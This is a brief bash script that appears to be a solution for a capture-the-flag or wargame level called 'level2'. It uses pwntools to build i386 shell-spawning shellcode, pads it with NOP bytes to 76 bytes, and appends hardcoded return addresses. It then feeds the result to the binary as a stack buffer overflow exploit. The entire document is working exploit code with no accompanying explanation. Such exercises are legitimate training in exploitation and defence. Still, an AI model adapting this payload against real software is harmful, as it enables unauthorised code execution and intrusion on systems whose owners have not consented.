#!/usr/bin/env bash
set -euo pipefail

exec ./level2 < <(python2.7 -c '
import os
from pwn import asm, p32, shellcraft

os.write(
    1,
    asm(shellcraft.i386.linux.sh()).ljust(76, b"\x90")
    + p32(0xbffff738)
    + p32(0x080484cf) + b"\n")')
